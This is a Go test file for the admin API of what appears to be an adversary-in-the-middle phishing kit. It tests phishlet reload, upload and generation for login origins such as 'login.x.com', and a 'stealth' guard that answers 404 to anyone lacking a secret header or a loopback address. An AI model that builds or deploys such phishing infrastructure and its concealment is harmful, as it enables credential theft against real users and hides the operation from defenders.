package api

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/internal/blocklist"
	"github.com/phantom-v2/phantom/internal/lures"
)

func testDeps() Deps {
	st := phishlet.NewStore()
	_ = st.LoadDir("../../configs/phishlets")
	return Deps{
		StealthHost: "api-internal.example.com",
		Store:       st,
		Blocked:     blocklist.New(),
		Lures:       lures.New(),
		StartedAt:   time.Now(),
	}
}

func TestStealthHeader(t *testing.T) {
	h := Handler(testDeps())
	// без заголовка — 404 (stealth)
	req := httptest.NewRequest("GET", "/api/v1/stats", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected stealth 404, got %d", rec.Code)
	}
	req2 := httptest.NewRequest("GET", "/api/v1/stats", nil)
	req2.Header.Set("X-Stealth-Host", "api-internal.example.com")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("expected 200, got %d", rec2.Code)
	}
	var stats map[string]any
	if err := json.NewDecoder(rec2.Body).Decode(&stats); err != nil {
		t.Fatal(err)
	}
}

func TestUIGating(t *testing.T) {
	h := Handler(testDeps())
	// loopback без stealth-хедера — UI отдается
	req := httptest.NewRequest("GET", "/ui/dashboard.html", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("loopback ui: %d", rec.Code)
	}
	// чужой хост/IP — 404
	req2 := httptest.NewRequest("GET", "/ui/dashboard.html", nil)
	req2.Host = "evil.example.com"
	req2.RemoteAddr = "8.8.8.8:1234"
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusNotFound {
		t.Fatalf("foreign ui: %d", rec2.Code)
	}
}

// /dashboard за тем же stealth-guard: без X-Stealth-Host — 404,
// с корректным хостом — 200 + html.
func TestDashboardStealth(t *testing.T) {	h := Handler(testDeps())

	req := httptest.NewRequest("GET", "/dashboard", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected stealth 404, got %d", rec.Code)
	}

	req2 := httptest.NewRequest("GET", "/dashboard", nil)
	req2.Header.Set("X-Stealth-Host", "api-internal.example.com")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("expected 200, got %d", rec2.Code)
	}
	if ct := rec2.Header().Get("Content-Type"); ct != "text/html; charset=utf-8" {
		t.Fatalf("dashboard must be html, got %q", ct)
	}
	if body := rec2.Body.String(); !strings.Contains(body, "Phantom v2") {
		t.Fatalf("dashboard body missing title, got %q", body)
	}
}

func withHooks(d Deps) Deps {
	d.OnReload = func() error { return nil }
	d.OnUpsert = func(yml []byte) (string, error) {
		up, ok := d.Store.(interface {
			UpsertYAML([]byte) (*core.Phishlet, error)
		})
		if !ok {
			return "", errNoUpsert
		}
		p, err := up.UpsertYAML(yml)
		if err != nil {
			return "", err
		}
		return p.ID, nil
	}
	d.OnGenerate = func(origin, domain, id, sub, _ string) (string, error) {
		if sub == "" {
			sub = "gen"
		}
		return "id: " + id + "\norigin: " + origin + "\n", nil
	}
	return d
}

var errNoUpsert = errString("no upsert")

type errString string

func (e errString) Error() string { return string(e) }

func stealthReq(method, path, body string) *http.Request {
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(method, path, nil)
	} else {
		req = httptest.NewRequest(method, path, strings.NewReader(body))
	}
	req.Header.Set("X-Stealth-Host", "api-internal.example.com")
	return req
}

func TestHotReloadEndpoints(t *testing.T) {
	h := Handler(withHooks(testDeps()))
	// reload → 204
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, stealthReq(http.MethodPost, "/api/v1/phishlets/reload", ""))
	if rec.Code != http.StatusNoContent {
		t.Fatalf("reload: %d", rec.Code)
	}
	// upsert valid → 201
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, stealthReq(http.MethodPost, "/api/v1/phishlets",
		"id: hotapi\nversion: 2\nbase_domains: [\"a.test\"]\nproxy_hosts: [{phish_sub: \"l\", orig_sub: \"o\", domain: \"u.test\"}]\nlure_path: \"/l/hotapi\"\nenabled: true\n"))
	if rec2.Code != http.StatusCreated {
		t.Fatalf("upsert: %d %s", rec2.Code, rec2.Body.String())
	}
	// upsert garbage → 400, живой стор цел
	rec3 := httptest.NewRecorder()
	h.ServeHTTP(rec3, stealthReq(http.MethodPost, "/api/v1/phishlets", "id: [broken"))
	if rec3.Code != http.StatusBadRequest {
		t.Fatalf("bad upsert: %d", rec3.Code)
	}
	// generate → yaml
	rec4 := httptest.NewRecorder()
	h.ServeHTTP(rec4, stealthReq(http.MethodPost, "/api/v1/phishlets/generate",
		`{"origin":"login.x.com","domain":"p.test","id":"g1"}`))
	if rec4.Code != 200 || !strings.Contains(rec4.Body.String(), "g1") {
		t.Fatalf("generate: %d %s", rec4.Code, rec4.Body.String())
	}
}
